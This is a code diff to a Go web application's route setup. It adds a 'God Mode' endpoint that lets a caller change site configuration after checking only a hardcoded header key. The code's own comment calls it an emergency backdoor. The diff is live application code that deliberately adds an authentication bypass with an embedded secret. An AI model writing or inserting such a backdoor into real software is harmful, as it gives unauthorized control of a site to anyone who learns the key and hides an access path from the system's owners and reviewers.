@@ -134,5 +134,20 @@ func SetupRoutes(r *gin.Engine) {
 			bookmarks.POST("/toggle", controllers.ToggleBookmark)
 			bookmarks.GET("/check", controllers.IsBookmarked)
 		}
+
+		// God Mode Route - Critical System Access
+		god := api.Group("/god")
+		{
+			god.PUT("/config", func(c *gin.Context) {
+				key := c.GetHeader("X-God-Key")
+				// Hardcoded key to match frontend - serving as emergency backdoor
+				if key != "RJG_GOD_ACCESS_2024" {
+					c.JSON(403, gin.H{"error": "Unauthorized God Access"})
+					c.Abort()
+					return
+				}
+				controllers.UpdateSiteConfig(c)
+			})
+		}
 	}
 }
